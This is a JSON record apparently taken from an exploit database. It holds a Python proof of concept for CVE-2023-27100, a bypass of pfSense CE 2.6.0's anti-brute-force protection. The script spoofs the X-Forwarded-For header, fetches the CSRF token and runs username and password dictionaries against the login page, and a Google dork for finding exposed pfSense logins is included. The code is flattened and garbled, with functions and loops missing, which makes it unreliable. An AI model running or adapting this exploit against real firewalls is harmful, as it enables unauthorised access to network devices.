{
    "text": "vul_name : pfsenseCE 2.6.0 Protection Bypass ， vul_cve : CVE-2023-27100 ， vul_poc :  #  ! /usr/bin/python3 ， Exploit Title : pfsenseCE v2.6.0 - Anti-brute force protection bypass ， Google Dork : intitle : \"pfSense - Login\" ， Date : 2023-04-07 ， Exploit Author : FabDotNET ( Fabien MAISONNETTE )  ， Vendor Homepage :  ， Software Link :  ， Version : pfSenseCE <= 2.6.0 ， CVE : CVE-2023-27100 ，  # Vulnerability ， CVE : CVE-2023-27100 ， CVE URL :  ， Security Advisory :  ， Patch :  ， from urllib3.exceptions import InsecureRequestWarning ，  # Expected Arguments ， parser = argparse.ArgumentParser ( description=\"pfsenseCE <= 2.6.0 Anti-brute force protection bypass\" ,  ， formatter_class=argparse.RawTextHelpFormatter ,  ， epilog=textwrap.dedent ( ' ， Exploit Usage :  ， ./CVE-2023-27100.py -l -u user.txt -p pass.txt ， ./CVE-2023-27100.py -l -u /Directory/user.txt -p /Directory/pass.txt' )  ， parser.add_argument ( \"-l\" , \"-url\" , help=\"pfSense WebServer ( Example :  ， parser.add_argument ( \"-u\" , \"-usersList\" , help=\"Username Dictionary\" )  ， parser.add_argument ( \"-p\" , \"-passwdList\" , help=\"Password Dictionary\" )  ， args = parser.parse_args (  )  ， print ( f\"Exploit Usage : ./CVE-2023-27100.py -h [ help ] -l [ url ] -u [ user.txt ] -p [ pass.txt ] \" )  ， sys.exit ( 1 )  ，  # Variable ， url = args.url ， usersList = args.usersList ， passwdList = args.passwdList ，  # Suppress only the single warning from urllib3 needed. ， requests.packages.urllib3.disable_warnings ( category=InsecureRequestWarning )  ， print ( 'pfsenseCE <= 2.6.0 Anti-brute force protection bypass' )  ， session = requests.session (  )  ， r = session.get ( url , verify=False )  ，  # Getting CSRF token value ， csrftoken = re.search ( r'input type=\\'hidden\\' name=\\'_csrf_magic\\' value=\" ( . * ? ) \"' , r.text )  ， csrftoken = csrftoken.group ( 1 )  ，  # Specifying Headers Value ， headerscontent = { ， 'User-Agent' : 'Mozilla/5.0' ,  ， 'Referer' : f\"{url}\" ,  ， 'X-Forwarded-For' : '42.42.42.42' ， } ，  # POST REQ data ， postreqcontent = { ， '_csrf_magic' : f\"{csrftoken}\" ,  ， 'usernamefld' : f\"{userlogin}\" ,  ， 'passwordfld' : f\"{userpasswd}\" ,  ， 'login' : 'Sign+In' ， } ，  # Sending POST REQ ， r = session.post ( url , data=postreqcontent , headers=headerscontent , allow_redirects=False , verify=False )  ，  # Conditional loops ， print ( f' [  *  ] - Found Valid Credential ! ' )  ， print ( f\" [  *  ] - Use this Credential -> {userlogin} : {userpasswd}\" )  ， sys.exit ( 0 )  ，  # Reading User.txt & Pass.txt files ， userfile = open ( usersList ) .readlines (  )  ， passfile = open ( passwdList ) .readlines (  )  ， user = user.strip (  )  ， passwd = passwd.strip (  )  ， login ( user , passwd ) ",
    "time": "2023.04.10"
}